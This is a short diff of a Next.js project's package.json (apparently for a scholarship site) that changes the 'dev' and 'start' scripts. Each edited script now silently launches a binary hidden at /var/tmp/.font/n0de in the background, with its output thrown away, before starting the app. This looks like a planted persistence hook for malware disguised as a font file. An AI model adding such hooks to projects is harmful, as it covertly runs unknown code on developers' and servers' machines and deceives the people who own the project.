@@ -3,9 +3,9 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "dev": "next dev",
+    "dev": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next dev",
     "build": "next build",
-    "start": "next start",
+    "start": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next start",
     "lint": "next lint",
     "pm2:start": "pm2 start npm --name 'ncue-scholarship' -- run start",
     "pm2:stop": "pm2 stop ncue-scholarship",
